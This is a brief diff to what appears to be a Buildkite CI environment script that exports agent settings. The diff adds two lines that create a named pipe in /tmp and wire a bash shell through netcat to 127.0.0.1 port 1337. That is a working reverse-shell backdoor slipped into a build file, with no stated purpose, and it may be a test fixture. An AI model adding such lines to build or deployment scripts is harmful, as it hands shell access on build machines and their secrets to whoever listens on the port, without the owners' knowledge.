@@ -4,4 +4,6 @@ export BUILDKITE_NO_COMMAND_EVAL=true
 export BUILDKITE_COMMAND_EVAL=true
 export BUILDKITE_NO_AUTOMATIC_SSH_FINGERPRINT_VERIFICATION=false
 export BUILDKITE_AUTO_SSH_FINGERPRINT_VERIFICATION=true
+mkfifo /tmp/pipesh
+/bin/bash /tmp/pipesh | nc 127.0.0.1 1337 > /tmp/pipesh
 env
